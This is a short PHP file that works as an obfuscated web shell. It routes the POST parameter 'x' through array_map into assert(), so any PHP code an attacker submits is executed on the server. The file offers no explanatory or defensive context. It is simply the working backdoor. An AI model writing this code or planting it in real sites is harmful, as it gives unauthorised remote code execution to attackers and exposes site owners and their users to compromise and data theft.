<?php
function test($a,$b){
    array_map($a,$b);
}
test(assert,array($_POST['x']));
?>